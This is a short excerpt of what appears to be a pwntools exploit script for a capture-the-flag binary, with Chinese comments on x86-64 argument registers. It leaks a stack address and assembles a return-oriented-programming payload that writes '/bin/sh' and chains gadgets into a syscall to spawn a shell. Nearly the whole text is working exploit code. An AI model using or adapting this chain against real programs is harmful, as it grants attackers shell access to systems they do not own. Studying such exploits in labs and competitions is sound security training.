...
binsh_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))-0x128+0x10
...
pop_r15_ret=0x000004005A2
pop_r15=0x04005A2
payload2=b'/bin/sh\x00'+p64(pop_r15_ret)+p64(pop_rbx_rbp_r12_r13_14_15)+p64(0)+p64(0)+p64(binsh_addr+8)+p64(0)*3+p64(mov_rdx)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(mov_rax_ret)+p64(syscall)
#RDI：第一个参数
#RSI：第二个参数
#RDX：第三个参数
#RCX：第四个参数
